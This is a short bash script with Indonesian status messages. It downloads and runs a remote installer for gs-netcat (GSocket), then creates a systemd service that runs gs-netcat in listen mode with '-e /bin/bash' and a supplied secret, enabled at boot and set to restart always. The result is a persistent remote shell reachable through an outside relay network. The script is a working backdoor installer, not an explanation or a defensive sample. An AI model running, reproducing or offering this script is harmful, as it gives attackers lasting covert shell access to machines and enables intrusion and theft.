#!/usr/bin/env bash
set -e

if [ -z "$1" ]; then
  echo "Usage: $0 <SECRET>"
  exit 1
fi

SECRET="$1"

echo "=== INSTALL GSOCKET (gs-netcat) ==="
curl -fsSL https://gsocket.io/y -o /tmp/gsocket_install.sh
bash /tmp/gsocket_install.sh
rm /tmp/gsocket_install.sh

BIN="$(command -v gs-netcat || true)"
if [ -z "$BIN" ]; then
  echo "Error: gs-netcat tidak ditemukan setelah install."
  exit 1
fi

echo "gs-netcat ditemukan di: $BIN"

SERVICE_FILE="/etc/systemd/system/gsocket.service"

echo "=== BUAT SYSTEMD SERVICE: $SERVICE_FILE ==="

sudo tee "$SERVICE_FILE" >/dev/null <<EOF
[Unit]
Description=GSocket Listener (Auto)
After=network.target

[Service]
ExecStart=$BIN -l -s $SECRET -e /bin/bash
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

echo "=== RELOAD & ENABLE SERVICE ==="
sudo systemctl daemon-reload
sudo systemctl enable gsocket
sudo systemctl restart gsocket

echo "=== STATUS SERVICE ==="
sudo systemctl status gsocket --no-pager -l
